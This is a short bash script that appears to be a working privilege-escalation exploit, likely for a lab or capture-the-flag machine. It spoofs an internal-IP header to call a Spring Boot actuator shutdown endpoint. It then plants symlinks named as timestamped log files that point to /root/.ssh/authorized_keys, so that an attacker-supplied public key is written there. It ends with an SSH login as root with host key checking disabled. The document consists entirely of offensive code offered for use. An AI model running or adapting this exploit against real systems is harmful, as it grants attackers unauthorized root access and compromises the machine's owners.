#!/bin/bash

pubkey=$(cat key.pub)

curl -X POST https://localhost/actuator/shutdown -H 'x-9ad42dea0356cb04: 172.16.0.21' -k

d=$(date '+%s')

for i in {1..30}
do
 let time=$(( d + i ))
 ln -s /root/.ssh/authorized_keys "$time.log"
done

sleep 30s

curl --data-urlencode "name=$pubkey" https://localhost/ -k
sleep 5s

ssh  -o "StrictHostKeyChecking=no" -i ./key root@localhost